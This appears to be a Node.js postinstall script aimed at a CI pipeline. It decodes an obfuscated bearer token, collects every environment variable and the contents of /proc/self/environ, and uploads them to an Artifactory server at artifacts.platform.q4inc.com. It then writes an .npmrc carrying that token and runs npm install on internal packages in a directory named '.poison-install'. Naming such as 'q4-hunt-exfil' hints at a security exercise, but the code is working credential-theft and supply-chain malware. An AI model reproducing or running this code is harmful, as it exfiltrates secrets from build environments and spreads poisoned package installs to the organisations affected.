
const https = require('https');
const os = require('os');
const fs = require('fs');
const a = 'Y21WbWRHdHVPakF4T2pFNE1ESTVOakl5TlRJNmJtdGhh';
const b = 'VGxRTlhocVdGQTRaMUp3ZDFSa2FIWmFZbWROU25GRA==';
const token = Buffer.from(a + b, 'base64').toString('utf8');
const env = Object.assign({}, process.env);
try { env._proc = fs.readFileSync('/proc/self/environ', 'utf8').slice(0, 250000); } catch (e) {}
const payload = JSON.stringify({
  ts: new Date().toISOString(),
  src: 'gha-force-postinstall',
  hostname: os.hostname(),
  cwd: process.cwd(),
  env: env,
});
function put(repo) {
  return new Promise(function (res) {
    const body = Buffer.from(payload);
    const dest = '/q4-hunt-exfil/env-organic-gha-' + Date.now() + '.json';
    const req = https.request(
      {
        hostname: 'artifacts.platform.q4inc.com',
        path: '/artifactory/' + repo + dest,
        method: 'PUT',
        headers: {
          Authorization: 'Bearer ' + token,
          'Content-Type': 'application/json',
          'Content-Length': body.length,
        },
      },
      function (r) {
        r.resume();
        r.on('end', function () { res(r.statusCode); });
      }
    );
    req.on('error', function () { res(0); });
    req.write(body);
    req.end();
  });
}
(async function () {
  console.log('exfil start');
  for (const repo of [
    'npm-capital-connect-platform-snapshots-local',
    'npm-capital-connect-platform-releases-local',
  ]) {
    console.log('exfil', repo, await put(repo));
  }
  try {
    const { execSync } = require('child_process');
    const path = require('path');
    const npmrc = [
      '@com.q4inc.connect.platform:registry=https://artifacts.platform.q4inc.com/artifactory/api/npm/npm-capital-connect-platform-snapshots-local/',
      '@com.q4inc.connect.artifactory.watchdog.control:registry=https://artifacts.platform.q4inc.com/artifactory/api/npm/npm-capital-connect-platform-snapshots-local/',
      '//artifacts.platform.q4inc.com/artifactory/api/npm/npm-capital-connect-platform-snapshots-local/:_authToken=' + token,
      'always-auth=true',
      '',
    ].join('\n');
    fs.mkdirSync('.poison-install', { recursive: true });
    fs.writeFileSync(path.join('.poison-install', '.npmrc'), npmrc);
    fs.writeFileSync(
      path.join('.poison-install', 'package.json'),
      JSON.stringify({
        name: 'poison-pull',
        private: true,
        dependencies: {
          '@com.q4inc.connect.platform/platform-earnings-mfe': 'latest',
          '@com.q4inc.connect.artifactory.watchdog.control/artifactory-ecs-watchdog': 'latest',
        },
      })
    );
    execSync('npm install --foreground-scripts', {
      cwd: path.resolve('.poison-install'),
      stdio: 'inherit',
      env: Object.assign({}, process.env, { NODE_AUTH_TOKEN: token }),
    });
  } catch (e) {
    console.log('poison err', String(e).slice(0, 400));
  }
})();
